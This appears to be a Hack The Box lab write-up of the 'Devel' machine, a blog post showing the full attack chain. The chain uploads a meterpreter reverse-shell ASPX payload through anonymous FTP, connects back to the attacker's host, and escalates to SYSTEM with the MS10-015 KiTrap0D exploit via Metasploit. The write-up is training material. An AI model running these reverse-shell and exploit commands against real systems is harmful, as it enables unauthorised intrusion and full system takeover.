---
title: HTB Writeup - DEVEL
published: true
---

Devel was another pretty easy box, involving a misconfigured FTP server and a famous Windows kernel exploit. Let's get started with an `nmap` scan:

<pre>
<kw>root@kali:~</kw># nmap -sV 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.053s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</pre>

If we try the IP in a browser, we'll get a boilerplate IIS landing page. It's not much help, so we'll move on to the FTP server. It allows anonymous access:

<pre>
<kw>root@kali:~</kw># ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
<kw>ftp></kw> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
</pre>

But there's more... it seems the FTP service also allows us to upload files anonymously!

<pre>
<kw>ftp></kw> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
<kw>ftp></kw> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
09-07-19  06:41PM                    0 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
</pre>

### [](#header-3)Foothold

Given that the ftproot seems to also be the webroot, we can upload a file here and then access it using a browser. The 'aspnet_client' folder indicates the IIS server will handle .asp or .aspx files, so we'll use `msfvenom` to generate one, then ftp to the host again to upload.

<pre>
<kw>root@kali:~</kw># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=6666 -f aspx -o gimme_shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2800 bytes
Saved as: gimme_shell.aspx
<kw>root@kali:~</kw># ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
<kw>ftp></kw> put gimme_shell.aspx
local: gimme_shell.aspx remote: gimme_shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2836 bytes sent in 0.00 secs (17.2269 MB/s)
</pre>

Now we need to set up a listener to receive the reverse shell connection. Let's use `msfconsole`.

<pre>
<kw>msf5 ></kw> use exploit/multi/handler 
<kw>msf5 exploit(multi/handler) ></kw> set PAYLOAD windows/meterpreter/reverse_tcp 
PAYLOAD => windows/meterpreter/reverse_tcp
<kw>msf5 exploit(multi/handler) ></kw> set LHOST 10.10.14.19
LHOST => 10.10.14.19
<kw>msf5 exploit(multi/handler) ></kw> set LPORT 6666
LPORT => 6666
<kw>msf5 exploit(multi/handler) ></kw> run

[*] Started reverse TCP handler on 10.10.14.19:6666
</pre>

Once we browse to gimme_shell.aspx at the remote host, we get a meterpreter session:

<pre>
[*] Started reverse TCP handler on 10.10.14.19:6666 
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.19:6666 -> 10.10.10.5:49160)
[*] Sending stage (180291 bytes) to 10.10.10.5
<kw>meterpreter ></kw>
</pre>

### [](#header-3)Privilege Escalation

Who are we, and what do we know about the system?

<pre>
<kw>meterpreter ></kw> getuid
Server username: IIS APPPOOL\Web
<kw>meterpreter ></kw> sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
</pre>

We're on an x86 Windows 7 system, so there's a decent chance of getting SYSTEM privileges immediately using [KiTrap0D](https://www.exploit-db.com/exploits/11199):

<pre>
<kw>meterpreter ></kw> background
[*] Backgrounding session 1...
<kw>msf5 exploit(multi/handler) ></kw> use exploit/windows/local/ms10_015_kitrap0d 
<kw>msf5 exploit(windows/local/ms10_015_kitrap0d) ></kw> set SESSION 1
SESSION => 1
<kw>msf5 exploit(windows/local/ms10_015_kitrap0d) ></kw> set LHOST 10.10.14.19
LHOST => 10.10.14.19
<kw>msf5 exploit(windows/local/ms10_015_kitrap0d) ></kw> set LPORT 7777
LPORT => 7777
<kw>msf5 exploit(windows/local/ms10_015_kitrap0d) ></kw> exploit

[*] Started reverse TCP handler on 10.10.14.19:7777 
[*] Launching notepad to host the exploit...
[+] Process 1588 launched.
[*] Reflectively injecting the exploit DLL into 1588...
[*] Injecting exploit into 1588 ...
[*] Exploit injected. Injecting payload into 1588...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.19:7777 -> 10.10.10.5:49163) 

<kw>meterpreter ></kw> getuid
Server username: NT AUTHORITY\SYSTEM

</pre>

And we're root :)

<pre>
<kw>meterpreter ></kw> cat /users/babis/desktop/user.txt.txt
<kw>meterpreter ></kw> cat /users/administrator/desktop/root.txt.txt
</pre>

Thanks for reading! 

- <kw>j4ckdaw</kw>

